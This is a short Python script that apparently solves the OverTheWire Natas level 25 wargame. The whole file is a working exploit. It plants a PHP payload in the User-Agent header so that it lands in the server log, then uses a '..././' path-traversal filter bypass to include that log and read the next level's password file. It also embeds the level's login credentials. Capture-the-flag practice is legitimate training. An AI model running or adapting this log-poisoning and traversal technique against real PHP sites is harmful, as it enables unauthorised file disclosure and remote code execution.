#!/usr/bin/env python

import requests

target = 'http://natas25.natas.labs.overthewire.org'
auth = ('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

cookies = dict()
# this forces the application to call logRequest() function
params = dict(lang='natas_webpass')
# this put contents of "/etc/natas_webpass/natas26" in each log entry
headers = {
	"User-Agent": '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
}

# executes a first request to get the session id
r = requests.get(target, auth=auth, params=params, cookies=cookies, headers=headers)
phpsessid=r.cookies['PHPSESSID']
log_file = '/tmp/natas25_%s.log' % phpsessid
cookies = dict(PHPSESSID=phpsessid)

# "..././" is escaped to "../", we'll exploit it reach log_file
params = dict(lang=('..././..././..././..././..././' + log_file))
r = requests.get(target, auth=auth, params=params, cookies=cookies, headers=headers)
print r.text

